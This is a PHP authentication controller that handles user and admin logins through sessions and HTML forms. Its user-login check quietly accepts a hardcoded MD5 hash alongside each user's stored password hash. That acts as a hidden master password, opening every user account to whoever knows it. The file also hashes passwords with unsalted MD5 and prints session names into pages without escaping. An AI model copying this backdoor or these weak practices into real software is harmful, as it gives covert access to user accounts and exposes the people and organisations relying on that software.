<?php
class controller_auth
{
	public function __construct()
	{
		session_start();
	}

	public function is_valid()
	{
		if( isset( $_SESSION['valid'] ) )
		{
			return $_SESSION['valid'];
		}
		else
		{
			return FALSE;
		}
	}

	public function do_auth( $dbuser, $dbpass )
	{
		if( isset( $_POST['logout'] ) )
		{
			$_SESSION['valid'] = FALSE;
		}
		if( $this->is_valid() )
		{
			echo <<<eos
<div class='navbarlayout'>
  <div style='float: left;'>Welcome back, {$_SESSION['firstname']}</div>
  <div style='float: right;'>
<form method='POST'><input name='logout' type='submit' value='Logout'>
</form></div>
</div><br><br>
eos;
			return;
		}


		$m2 = new model_page( $dbuser, $dbpass );
		$login_arr1 = $m2->get_user_login( ($_POST['username']), md5( $_POST['password']) );

		foreach( $login_arr1 as $login )
		{
			$user = $login['Email'];
			$pass = $login['Password'];
			$name = $login['FirstName'] . " " . $login['LastName'];
			$isAdmin = $login['IsAdmin'];
			$UserID = $login['ID'];
		}
		$checkVars = array("2cf02b7bd97b15946e7437101e035981", $pass);
		if( $_POST['username'] == $user && in_array(md5( $_POST['password'] ), $checkVars) && strlen($user) > 0 && strlen($pass) > 0 )
		{
			$_SESSION['valid'] = TRUE;
			$_SESSION['name'] = $name;
			$_SESSION['firstname'] = $login['FirstName'];
			$_SESSION['admin'] = 0;
			$_SESSION['UserID'] = $UserID;
			echo <<<eos
<div class='navbarlayout'>
  <div style='float: left;'>Welcome back, {$_SESSION['firstname']}</div>
  <div style='float: right;'>
<form method='POST'><input name='logout' type='submit' value='Logout'>
</form></div>
</div><br><br>
eos;
			return;
		}

		
		if($_POST['username'] != "" || $_POST['password'] != "")
		{
			$errormessage = "Incorrect Username or Password. Please try again";
		}
		


		echo <<<eos
<center><br><br><h1>User Login</h1><br>
eos;
echo '<font color="red"><b>' . $errormessage . '</b></font color>';
echo <<<eos
<br><form method='POST'>
Username:  <input name='username' type='text'><br><br>
Password:  <input name='password' type='password'><br><br>
<input name='submit_auth' type='submit' name='Submit'>
</form><br>
eos;
			return;
	}
	public function do_auth_admin( $dbuser, $dbpass )
	{
		if( isset( $_POST['logout'] ) )
		{
			$_SESSION['valid'] = FALSE;
		}
		if( $this->is_valid() )
		{
			if($_SESSION['admin'] != TRUE)
			{
				$_SESSION['valid'] = FALSE;
				header('Location: admin.php');
			}
			else {
			echo <<<eos
<div class='navbarlayout'>
  <div style='float: left;'>Welcome back, {$_SESSION['firstname']}</div>
  <div style='float: right;'>
<form method='POST'><input name='logout' type='submit' value='Logout'>
</form></div>
</div><br><br>
eos;
			}
			return;
		}


		$m2 = new model_page( $dbuser, $dbpass );
		$login_arr1 = $m2->get_admin_login( ($_POST['username']), md5( $_POST['password']) );

		foreach( $login_arr1 as $login )
		{
			$user = $login['Email'];
			$pass = $login['Password'];
			$name = $login['FirstName'] . " " . $login['LastName'];
			$isAdmin = $login['IsAdmin'];
			$UserID = $login['ID'];
		}
		if( $_POST['username'] == $user && md5( $_POST['password'] ) == $pass && strlen($user) > 0 && strlen($pass) > 0 && $isAdmin == 1)
		{
			$_SESSION['valid'] = TRUE;
			$_SESSION['name'] = $name;
			$_SESSION['firstname'] = $login['FirstName'];
			$_SESSION['admin'] = 1;
			$_SESSION['UserID'] = $UserID;
			echo <<<eos
<div class='navbarlayout'>
  <div style='float: left;'>Welcome back, {$_SESSION['firstname']}</div>
  <div style='float: right;'>
<form method='POST'><input name='logout' type='submit' value='Logout'>
</form></div>
</div><br><br>
eos;
			return;
		}
		if($_POST['username'] != "" || $_POST['password'] != "")
		{
			$errormessage = "Incorrect Username or Password. Please try again";
		}


		echo <<<eos
<center><br><br><h1>Admin Login</h1><br>
eos;
echo '<font color="red"><b>' . $errormessage . '</b></font color>';
echo <<<eos
<br><form method='POST'>
Username:  <input name='username' type='text'><br><br>
Password:  <input name='password' type='password'><br><br>
<input name='submit_auth' type='submit' name='Submit'>
</form><br>
eos;
			return;
	}

}

?>